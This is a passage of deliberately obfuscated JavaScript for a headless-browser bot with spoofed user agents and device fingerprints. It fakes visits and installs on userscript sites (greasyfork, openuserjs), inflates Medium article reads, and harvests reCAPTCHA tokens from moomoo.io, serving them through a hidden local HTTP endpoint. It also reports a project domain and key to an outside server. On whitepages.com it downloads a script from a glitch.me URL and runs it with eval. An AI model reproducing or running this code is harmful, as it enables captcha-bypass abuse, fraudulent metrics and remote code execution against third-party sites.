      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + a0(0x16) + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + Z(0x1b, 'Gmzp') + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + Z(0x1, 'X0Dm') + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + a0(0x1a) + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + a1(0x9) + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x9 * -0x3f + 0x2623 + -0x23ec
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x1c13 * 0x1 + -0x36a * -0xb + -0x35 * 0x13d)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x160e + -0x119a * 0x1 + -0x14 * 0x34), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x3e5 * 0x1 + 0x3 * 0x5dd + -0x83 * 0x1a), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x19c9 + 0x1a * 0x2e + 0x151d;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x2 * 0x327 + 0xd * 0x6 + 0x600; w < getRandomInt(-0x2597 + -0x1 * 0x24f7 + -0x1 * -0x4a8f, -0x1 * 0x8f5 + -0x14d + 0xa47); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x80e7 * 0x3 + 0x87dd + 0x1e538);
        }
      }();
    }, -0xe68 + -0xa6 + 0xf72), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const a2 = c;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + a2(0x14)]();
      let w = 0x2 * -0x27a + -0x17 * 0x33 + 0x1 * 0x989;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0xf64 + 0x5 * -0x2c9 + 0x13 * 0x18b, 0x4 + 0xdb5 * -0x1 + 0xde3)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x9fc4 + -0xb2 * -0x95 + 0xad5a);
    }, -0x1006 + -0xf9b + 0x2005), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x250e + -0x2105 + -0x409 * 0x1;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x1 * -0x15c5 + 0xe * -0x1d2 + -0x3af9 * -0x1), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x1fd7 + -0x1 * 0x2249 + 0x272), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x9ab * 0xa + 0x1463 * 0xe8 + -0x45d6a);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x16cc + -0x2525 + 0xebd);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x1c6e + -0x644 * 0x1 + 0xef * 0x26);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x2924 + 0x330a + 0x15aa);
}
doFlags['doOUJS'] && ((async () => {
  const a6 = b,
    a5 = d,
    a4 = c;
  async function f() {
    const a3 = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x20e3 * -0x1 + 0x2357 + 0xda5 * -0x5) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x607 + 0x1 * -0xb9b + 0x595));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x1 * -0x268f + 0x4 * 0x129 + -0x2b33, D['indexOf']('\x20'));
        return B ? E['slice'](0xcf8 + -0x1cf5 + 0x1 * 0xffd, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x2a2f + -0x1f * -0x277 + -0x4f88),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x26ba + -0x19 * -0x3d + -0x59f),
      'headers': {
        'host': 'openuserjs' + a3(0x2),
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + a4(0x18) + 'rces_and_m' + 'ore!!',
      'https://op' + a5(0x15) + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      a6(0x10, 'rN&l') + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
